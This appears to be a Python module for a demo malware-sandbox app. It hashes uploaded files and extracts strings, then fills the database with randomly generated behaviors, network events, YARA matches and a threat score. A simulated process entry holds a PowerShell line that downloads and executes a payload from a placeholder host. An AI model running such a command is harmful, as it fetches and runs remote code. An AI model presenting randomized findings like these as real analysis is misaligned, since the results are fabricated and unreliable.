import hashlib
import os
import time
import random
import json
import re
from datetime import datetime, timedelta
from models import (
    db, AnalysisSession, BehaviorEvent, NetworkEvent, ProcessEvent,
    DroppedFile, IOC, MitreAttack, StringAnalysis, MutexHandle,
    MemoryRegion, Screenshot, YaraMatch, Certificate
)
from PIL import Image, ImageDraw, ImageFont
import io
import base64


class AdvancedAnalyzer:
    """Advanced sandbox analyzer with comprehensive malware analysis capabilities"""

    def __init__(self):
        self.suspicious_patterns = [
            'CreateRemoteThread', 'WriteProcessMemory', 'VirtualAllocEx',
            'SetWindowsHookEx', 'GetAsyncKeyState', 'URLDownloadToFile',
            'WinExec', 'ShellExecute', 'CreateProcess', 'RegSetValue',
            'NtCreateThreadEx', 'RtlCreateUserThread', 'QueueUserAPC'
        ]

        self.malicious_domains = [
            'malicious-server.com', 'evil-cdn.net', 'phishing-site.org',
            'cryptominer.xyz', 'ransomware-c2.com', 'botnet-controller.io',
            'exploit-kit.ru', 'malware-distribution.net', 'c2-panel.onion'
        ]

        self.process_names = [
            'explorer.exe', 'cmd.exe', 'powershell.exe', 'rundll32.exe',
            'regsvr32.exe', 'svchost.exe', 'wscript.exe', 'cscript.exe',
            'mshta.exe', 'certutil.exe', 'bitsadmin.exe'
        ]

        # MITRE ATT&CK techniques
        self.mitre_techniques = {
            'T1055': {'name': 'Process Injection', 'tactic': 'Defense Evasion'},
            'T1059': {'name': 'Command and Scripting Interpreter', 'tactic': 'Execution'},
            'T1071': {'name': 'Application Layer Protocol', 'tactic': 'Command and Control'},
            'T1082': {'name': 'System Information Discovery', 'tactic': 'Discovery'},
            'T1083': {'name': 'File and Directory Discovery', 'tactic': 'Discovery'},
            'T1105': {'name': 'Ingress Tool Transfer', 'tactic': 'Command and Control'},
            'T1112': {'name': 'Modify Registry', 'tactic': 'Defense Evasion'},
            'T1140': {'name': 'Deobfuscate/Decode Files or Information', 'tactic': 'Defense Evasion'},
            'T1547': {'name': 'Boot or Logon Autostart Execution', 'tactic': 'Persistence'},
            'T1543': {'name': 'Create or Modify System Process', 'tactic': 'Persistence'},
            'T1070': {'name': 'Indicator Removal on Host', 'tactic': 'Defense Evasion'},
            'T1027': {'name': 'Obfuscated Files or Information', 'tactic': 'Defense Evasion'},
        }

        # YARA-like rules (simulated)
        self.yara_rules = [
            {'name': 'Ransomware_Generic', 'category': 'ransomware', 'severity': 'critical'},
            {'name': 'Trojan_Banker', 'category': 'trojan', 'severity': 'high'},
            {'name': 'Backdoor_Generic', 'category': 'backdoor', 'severity': 'high'},
            {'name': 'Cryptominer_Detection', 'category': 'miner', 'severity': 'medium'},
            {'name': 'Packer_UPX', 'category': 'packer', 'severity': 'low'},
            {'name': 'Webshell_Detection', 'category': 'webshell', 'severity': 'high'},
            {'name': 'Keylogger_Behavior', 'category': 'spyware', 'severity': 'high'},
        ]

    def calculate_file_hash(self, filepath):
        """Calculate multiple hashes of file"""
        md5_hash = hashlib.md5()
        sha1_hash = hashlib.sha1()
        sha256_hash = hashlib.sha256()

        with open(filepath, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                md5_hash.update(byte_block)
                sha1_hash.update(byte_block)
                sha256_hash.update(byte_block)

        return {
            'md5': md5_hash.hexdigest(),
            'sha1': sha1_hash.hexdigest(),
            'sha256': sha256_hash.hexdigest()
        }

    def detect_file_type(self, filepath):
        """Enhanced file type detection"""
        ext = os.path.splitext(filepath)[1].lower()
        type_map = {
            '.exe': 'Windows Executable (PE32)',
            '.dll': 'Dynamic Link Library',
            '.pdf': 'PDF Document',
            '.docx': 'Microsoft Word Document',
            '.xlsx': 'Microsoft Excel Spreadsheet',
            '.zip': 'ZIP Archive',
            '.rar': 'RAR Archive',
            '.js': 'JavaScript File',
            '.vbs': 'VBScript File',
            '.bat': 'Windows Batch File',
            '.ps1': 'PowerShell Script',
            '.py': 'Python Script',
            '.jar': 'Java Archive',
            '.apk': 'Android Package'
        }
        return type_map.get(ext, 'Unknown File Type')

    def extract_strings(self, filepath, session_id, min_length=4):
        """Extract strings from file"""
        strings = []

        # Read file content
        try:
            with open(filepath, 'rb') as f:
                content = f.read()

            # ASCII strings
            ascii_pattern = b'[\x20-\x7E]{' + str(min_length).encode() + b',}'
            for match in re.finditer(ascii_pattern, content):
                string_val = match.group().decode('ascii')
                string_type = self.classify_string(string_val)
                is_suspicious = self.is_suspicious_string(string_val)

                strings.append(StringAnalysis(
                    session_id=session_id,
                    string_type=string_type,
                    value=string_val[:500],  # Limit length
                    offset=match.start(),
                    is_suspicious=is_suspicious
                ))

                if len(strings) >= 100:  # Limit to 100 strings
                    break
        except Exception as e:
            print(f"Error extracting strings: {e}")

        return strings

    def classify_string(self, string_val):
        """Classify string type"""
        if re.match(r'^https?://', string_val):
            return 'url'
        elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', string_val):
            return 'ip'
        elif re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', string_val):
            return 'email'
        elif re.match(r'^[A-Z]:\\', string_val):
            return 'path'
        else:
            return 'ascii'

    def is_suspicious_string(self, string_val):
        """Check if string is suspicious"""
        suspicious_keywords = [
            'admin', 'password', 'cmd.exe', 'powershell', 'bitcoin',
            'wallet', 'ransom', 'decrypt', 'payload', 'exploit',
            'reverse_tcp', 'backdoor', 'rootkit', 'keylog'
        ]
        return any(kw in string_val.lower() for kw in suspicious_keywords)

    def generate_process_tree(self, session_id):
        """Generate realistic process tree"""
        processes = []
        base_time = datetime.utcnow()

        # Initial process (the malware itself)
        processes.append(ProcessEvent(
            session_id=session_id,
            timestamp=base_time,
            pid=1337,
            parent_pid=1234,
            process_name='sample.exe',
            command_line='"C:\\Users\\Sandbox\\Desktop\\sample.exe"',
            user='SANDBOX\\User',
            integrity_level='Medium',
            status='running'
        ))

        # Child processes
        if random.random() > 0.3:
            processes.append(ProcessEvent(
                session_id=session_id,
                timestamp=base_time + timedelta(seconds=2),
                pid=1338,
                parent_pid=1337,
                process_name='cmd.exe',
                command_line='cmd.exe /c whoami',
                user='SANDBOX\\User',
                integrity_level='Medium',
                status='terminated',
                exit_code=0
            ))

        if random.random() > 0.4:
            processes.append(ProcessEvent(
                session_id=session_id,
                timestamp=base_time + timedelta(seconds=3),
                pid=1339,
                parent_pid=1337,
                process_name='powershell.exe',
                command_line='powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://malicious.com/payload\')"',
                user='SANDBOX\\User',
                integrity_level='Medium',
                status='running'
            ))

        if random.random() > 0.5:
            processes.append(ProcessEvent(
                session_id=session_id,
                timestamp=base_time + timedelta(seconds=5),
                pid=1340,
                parent_pid=1339,
                process_name='rundll32.exe',
                command_line='rundll32.exe malicious.dll,EntryPoint',
                user='SANDBOX\\User',
                integrity_level='High',
                status='running'
            ))

        return processes

    def generate_dropped_files(self, session_id):
        """Generate dropped files"""
        files = []
        base_time = datetime.utcnow()

        dropped_file_patterns = [
            ('C:\\Users\\Sandbox\\AppData\\Local\\Temp\\tmp{}.exe', True),
            ('C:\\Users\\Sandbox\\AppData\\Roaming\\system32.dll', True),
            ('C:\\Users\\Sandbox\\Desktop\\README.txt', False),
            ('C:\\Windows\\Temp\\update.bat', True),
            ('C:\\ProgramData\\config.json', False),
        ]

        for i, (path_pattern, is_mal) in enumerate(random.sample(dropped_file_patterns, min(3, len(dropped_file_patterns)))):
            path = path_pattern.format(random.randint(1000, 9999))
            filename = os.path.basename(path)

            files.append(DroppedFile(
                session_id=session_id,
                timestamp=base_time + timedelta(seconds=i*2),
                file_path=path,
                file_name=filename,
                file_hash=hashlib.sha256(path.encode()).hexdigest(),
                file_size=random.randint(1024, 1024*1024),
                file_type=self.detect_file_type(filename),
                is_malicious=is_mal,
                dropped_by_pid=1337 + i
            ))

        return files

    def extract_iocs(self, session_id, network_events, strings, processes):
        """Extract Indicators of Compromise"""
        iocs = []

        # From network events
        for event in network_events:
            if event.domain:
                iocs.append(IOC(
                    session_id=session_id,
                    ioc_type='domain',
                    value=event.domain,
                    confidence='high',
                    description='Domain contacted during analysis',
                    source='Network Traffic'
                ))

            if event.destination_ip and not event.destination_ip.startswith('192.168'):
                iocs.append(IOC(
                    session_id=session_id,
                    ioc_type='ip',
                    value=event.destination_ip,
                    confidence='medium',
                    description='External IP contacted',
                    source='Network Traffic'
                ))

            if event.url:
                iocs.append(IOC(
                    session_id=session_id,
                    ioc_type='url',
                    value=event.url,
                    confidence='high',
                    description='URL accessed during analysis',
                    source='Network Traffic'
                ))

        # From strings
        for string_obj in strings:
            if string_obj.string_type in ['url', 'ip', 'email'] and string_obj.is_suspicious:
                iocs.append(IOC(
                    session_id=session_id,
                    ioc_type=string_obj.string_type,
                    value=string_obj.value,
                    confidence='low',
                    description='Suspicious string found in file',
                    source='String Analysis'
                ))

        # Limit IOCs
        return iocs[:50]

    def map_mitre_attack(self, session_id, behaviors, processes):
        """Map behaviors to MITRE ATT&CK framework"""
        techniques = []

        # Process injection detection
        if any('CreateRemoteThread' in b.description or 'WriteProcessMemory' in b.description for b in behaviors):
            tech = self.mitre_techniques['T1055']
            techniques.append(MitreAttack(
                session_id=session_id,
                technique_id='T1055',
                technique_name=tech['name'],
                tactic=tech['tactic'],
                description='Detected process injection behavior',
                evidence='CreateRemoteThread or WriteProcessMemory API calls observed'
            ))

        # Command execution
        if any(p.process_name in ['cmd.exe', 'powershell.exe'] for p in processes):
            tech = self.mitre_techniques['T1059']
            techniques.append(MitreAttack(
                session_id=session_id,
                technique_id='T1059',
                technique_name=tech['name'],
                tactic=tech['tactic'],
                description='Command line interpreter execution detected',
                evidence='cmd.exe or powershell.exe execution observed'
            ))

        # Registry modification
        if any('registry' in b.event_type.lower() for b in behaviors):
            tech = self.mitre_techniques['T1112']
            techniques.append(MitreAttack(
                session_id=session_id,
                technique_id='T1112',
                technique_name=tech['name'],
                tactic=tech['tactic'],
                description='Registry modification for persistence',
                evidence='Registry keys modified'
            ))

        # Persistence
        if any('CurrentVersion\\Run' in b.description for b in behaviors):
            tech = self.mitre_techniques['T1547']
            techniques.append(MitreAttack(
                session_id=session_id,
                technique_id='T1547',
                technique_name=tech['name'],
                tactic=tech['tactic'],
                description='Boot/logon autostart execution',
                evidence='Run key modification detected'
            ))

        return techniques

    def generate_mutexes(self, session_id):
        """Generate mutex and handle information"""
        mutexes = []
        base_time = datetime.utcnow()

        mutex_names = [
            'Global\\MalwareMutex_{}'.format(random.randint(1000, 9999)),
            'Local\\SingleInstance',
            'Global\\{}-{}-{}-{}-{}'.format(*[random.randint(1000, 9999) for _ in range(5)]),
        ]

        for i, name in enumerate(random.sample(mutex_names, min(2, len(mutex_names)))):
            mutexes.append(MutexHandle(
                session_id=session_id,
                timestamp=base_time + timedelta(seconds=i),
                handle_type='mutex',
                name=name,
                pid=1337,
                access_rights='SYNCHRONIZE'
            ))

        return mutexes

    def generate_memory_regions(self, session_id):
        """Generate suspicious memory regions"""
        regions = []
        base_time = datetime.utcnow()

        # RWX regions are suspicious (executable + writable)
        for i in range(random.randint(1, 3)):
            regions.append(MemoryRegion(
                session_id=session_id,
                timestamp=base_time + timedelta(seconds=i),
                pid=1337,
                base_address=hex(0x10000000 + i * 0x10000),
                size=random.randint(4096, 1024*1024),
                protection='RWX',
                region_type='private',
                is_suspicious=True
            ))

        return regions

    def generate_screenshots(self, session_id):
        """Generate screenshot placeholders"""
        screenshots = []
        base_time = datetime.utcnow()

        screenshot_folder = os.path.join('results', session_id, 'screenshots')
        os.makedirs(screenshot_folder, exist_ok=True)

        # Generate a few fake screenshots
        for i in range(3):
            timestamp = base_time + timedelta(seconds=i*5)
            filename = f'screenshot_{i+1}.png'
            filepath = os.path.join(screenshot_folder, filename)

            # Create a simple screenshot image
            self.create_fake_screenshot(filepath, i+1)

            screenshots.append(Screenshot(
                session_id=session_id,
                timestamp=timestamp,
                filename=filename,
                description=f'Sandbox desktop at T+{i*5}s'
            ))

        return screenshots

    def create_fake_screenshot(self, filepath, number):
        """Create a fake screenshot image"""
        # Create a simple image with text
        img = Image.new('RGB', (800, 600), color=(50, 50, 100))
        draw = ImageDraw.Draw(img)

        # Draw some fake windows/UI elements
        draw.rectangle([50, 50, 750, 550], outline=(200, 200, 200), width=2)
        draw.rectangle([60, 60, 740, 100], fill=(30, 30, 80))

        # Add text
        try:
            draw.text((300, 250), f'Screenshot #{number}', fill=(255, 255, 255))
            draw.text((250, 300), 'Sandbox Environment', fill=(200, 200, 200))
        except:
            pass  # Font might not be available

        img.save(filepath)

    def run_yara_scan(self, session_id, filepath):
        """Simulate YARA rule scanning"""
        matches = []

        # Randomly match some rules
        matched_rules = random.sample(self.yara_rules, random.randint(0, 3))

        for rule in matched_rules:
            matches.append(YaraMatch(
                session_id=session_id,
                rule_name=rule['name'],
                category=rule['category'],
                severity=rule['severity'],
                description=f'Detected {rule["category"]} behavior patterns',
                matched_strings=json.dumps([
                    {'offset': random.randint(100, 10000), 'string': 'suspicious_pattern'},
                    {'offset': random.randint(100, 10000), 'string': 'malware_signature'}
                ])
            ))

        return matches

    def analyze_certificate(self, session_id, filepath):
        """Analyze file certificate (simulated for PE files)"""
        certificates = []

        if filepath.endswith('.exe') or filepath.endswith('.dll'):
            # Simulate certificate analysis
            if random.random() > 0.5:  # 50% have certificate
                is_valid = random.random() > 0.3
                is_trusted = is_valid and random.random() > 0.4

                certificates.append(Certificate(
                    session_id=session_id,
                    subject='CN=Malicious Corp, O=Evil Inc, C=RU',
                    issuer='CN=Fake CA, O=Untrusted Authority, C=Unknown',
                    serial_number=hex(random.randint(1000000, 9999999)),
                    valid_from=datetime.utcnow() - timedelta(days=365),
                    valid_to=datetime.utcnow() + timedelta(days=365),
                    thumbprint=hashlib.sha1(str(random.random()).encode()).hexdigest(),
                    is_valid=is_valid,
                    is_trusted=is_trusted
                ))

        return certificates

    def generate_behaviors(self, session_id, file_type):
        """Generate simulated behavioral events"""
        behaviors = []

        # Enhanced behaviors based on file type
        if random.random() > 0.3:
            behaviors.append(BehaviorEvent(
                session_id=session_id,
                event_type='file_created',
                description=f'Created file: C:\\Users\\Public\\temp_{random.randint(1000, 9999)}.tmp',
                severity='low',
                details=json.dumps({'path': 'C:\\Users\\Public\\', 'action': 'create'})
            ))

        if random.random() > 0.4:
            behaviors.append(BehaviorEvent(
                session_id=session_id,
                event_type='process_created',
                description=f'Started process: {random.choice(self.process_names)}',
                severity=random.choice(['medium', 'high']),
                details=json.dumps({'process': 'system', 'pid': random.randint(1000, 9999)})
            ))

        if random.random() > 0.5:
            behaviors.append(BehaviorEvent(
                session_id=session_id,
                event_type='registry_modified',
                description='Modified registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                severity='high',
                details=json.dumps({'key': 'HKCU\\Software\\...', 'action': 'set_value'})
            ))

        if random.random() > 0.6:
            api = random.choice(self.suspicious_patterns)
            behaviors.append(BehaviorEvent(
                session_id=session_id,
                event_type='api_call',
                description=f'Suspicious API call: {api}',
                severity='critical',
                details=json.dumps({'api': api, 'module': 'kernel32.dll'})
            ))

        if random.random() > 0.7:
            behaviors.append(BehaviorEvent(
                session_id=session_id,
                event_type='memory_allocation',
                description='Allocated executable memory region',
                severity='high',
                details=json.dumps({'size': f'{random.randint(100, 1000)}KB', 'protection': 'RWX'})
            ))

        return behaviors

    def generate_network_events(self, session_id):
        """Generate simulated network events"""
        events = []

        if random.random() > 0.3:
            domain = random.choice(self.malicious_domains)
            events.append(NetworkEvent(
                session_id=session_id,
                protocol='DNS',
                source_ip='192.168.1.100',
                destination_ip='8.8.8.8',
                destination_port=53,
                domain=domain,
                url=None
            ))

        if random.random() > 0.4:
            domain = random.choice(self.malicious_domains)
            method = random.choice(['GET', 'POST'])
            events.append(NetworkEvent(
                session_id=session_id,
                protocol=random.choice(['HTTP', 'HTTPS']),
                source_ip='192.168.1.100',
                destination_ip=f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}',
                destination_port=random.choice([80, 443, 8080]),
                domain=domain,
                url=f'https://{domain}/payload.exe',
                method=method,
                headers=json.dumps({'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}),
                payload='malicious_payload_data' if method == 'POST' else None,
                response_code=200
            ))

        if random.random() > 0.5:
            events.append(NetworkEvent(
                session_id=session_id,
                protocol='TCP',
                source_ip='192.168.1.100',
                destination_ip=f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}',
                destination_port=random.choice([4444, 5555, 6666, 1337]),
                domain=None,
                url=None
            ))

        return events

    def analyze_file(self, filepath, filename, session_id):
        """Perform comprehensive file analysis"""
        try:
            # Calculate file hashes
            hashes = self.calculate_file_hash(filepath)
            file_size = os.path.getsize(filepath)
            file_type = self.detect_file_type(filepath)

            # Create session in database
            session = AnalysisSession(
                session_id=session_id,
                filename=filename,
                file_hash=hashes['sha256'],
                file_size=file_size,
                file_type=file_type,
                status='analyzing'
            )
            db.session.add(session)
            db.session.commit()

            time.sleep(1)

            # String extraction
            strings = self.extract_strings(filepath, session_id)
            for string in strings:
                db.session.add(string)
            db.session.commit()
            time.sleep(0.5)

            # Generate behavioral events
            behaviors = self.generate_behaviors(session_id, file_type)
            for behavior in behaviors:
                db.session.add(behavior)
                db.session.commit()
                time.sleep(0.3)

            # Generate network events
            network_events = self.generate_network_events(session_id)
            for net_event in network_events:
                db.session.add(net_event)
                db.session.commit()
                time.sleep(0.3)

            # Process tree
            processes = self.generate_process_tree(session_id)
            for proc in processes:
                db.session.add(proc)
            db.session.commit()
            time.sleep(0.5)

            # Dropped files
            dropped_files = self.generate_dropped_files(session_id)
            for df in dropped_files:
                db.session.add(df)
            db.session.commit()

            # IOC extraction
            iocs = self.extract_iocs(session_id, network_events, strings, processes)
            for ioc in iocs:
                db.session.add(ioc)
            db.session.commit()

            # MITRE ATT&CK mapping
            mitre = self.map_mitre_attack(session_id, behaviors, processes)
            for m in mitre:
                db.session.add(m)
            db.session.commit()

            # Mutexes
            mutexes = self.generate_mutexes(session_id)
            for mutex in mutexes:
                db.session.add(mutex)
            db.session.commit()

            # Memory regions
            memory_regions = self.generate_memory_regions(session_id)
            for region in memory_regions:
                db.session.add(region)
            db.session.commit()

            # Screenshots
            screenshots = self.generate_screenshots(session_id)
            for screenshot in screenshots:
                db.session.add(screenshot)
            db.session.commit()

            # YARA scanning
            yara_matches = self.run_yara_scan(session_id, filepath)
            for match in yara_matches:
                db.session.add(match)
            db.session.commit()

            # Certificate analysis
            certificates = self.analyze_certificate(session_id, filepath)
            for cert in certificates:
                db.session.add(cert)
            db.session.commit()

            # Update session status
            session.status = 'completed'
            session.completed_at = datetime.utcnow()
            db.session.commit()

            return {
                'success': True,
                'session_id': session_id,
                'file_hash': hashes['sha256'],
                'file_type': file_type
            }

        except Exception as e:
            print(f"Analysis error: {e}")
            if session:
                session.status = 'error'
                db.session.commit()
            return {
                'success': False,
                'error': str(e)
            }

    def get_session_details(self, session_id):
        """Retrieve comprehensive analysis results"""
        session = AnalysisSession.query.filter_by(session_id=session_id).first()
        if not session:
            return None

        behaviors = BehaviorEvent.query.filter_by(session_id=session_id).all()
        network_events = NetworkEvent.query.filter_by(session_id=session_id).all()
        processes = ProcessEvent.query.filter_by(session_id=session_id).all()
        dropped_files = DroppedFile.query.filter_by(session_id=session_id).all()
        iocs = IOC.query.filter_by(session_id=session_id).all()
        mitre_attacks = MitreAttack.query.filter_by(session_id=session_id).all()
        strings = StringAnalysis.query.filter_by(session_id=session_id).all()
        mutexes = MutexHandle.query.filter_by(session_id=session_id).all()
        memory_regions = MemoryRegion.query.filter_by(session_id=session_id).all()
        screenshots = Screenshot.query.filter_by(session_id=session_id).all()
        yara_matches = YaraMatch.query.filter_by(session_id=session_id).all()
        certificates = Certificate.query.filter_by(session_id=session_id).all()

        return {
            'session': session.to_dict(),
            'behaviors': [b.to_dict() for b in behaviors],
            'network_events': [n.to_dict() for n in network_events],
            'processes': [p.to_dict() for p in processes],
            'dropped_files': [d.to_dict() for d in dropped_files],
            'iocs': [i.to_dict() for i in iocs],
            'mitre_attacks': [m.to_dict() for m in mitre_attacks],
            'strings': [s.to_dict() for s in strings[:50]],  # Limit strings
            'mutexes': [m.to_dict() for m in mutexes],
            'memory_regions': [m.to_dict() for m in memory_regions],
            'screenshots': [s.to_dict() for s in screenshots],
            'yara_matches': [y.to_dict() for y in yara_matches],
            'certificates': [c.to_dict() for c in certificates],
            'threat_score': self.calculate_threat_score(behaviors, network_events, yara_matches, mitre_attacks)
        }

    def calculate_threat_score(self, behaviors, network_events, yara_matches, mitre_attacks):
        """Calculate comprehensive threat score"""
        score = 0

        for behavior in behaviors:
            if behavior.severity == 'critical':
                score += 20
            elif behavior.severity == 'high':
                score += 12
            elif behavior.severity == 'medium':
                score += 5
            else:
                score += 1

        score += len(network_events) * 2

        for yara in yara_matches:
            if yara.severity == 'critical':
                score += 15
            elif yara.severity == 'high':
                score += 10
            elif yara.severity == 'medium':
                score += 5

        score += len(mitre_attacks) * 8

        return min(score, 100)
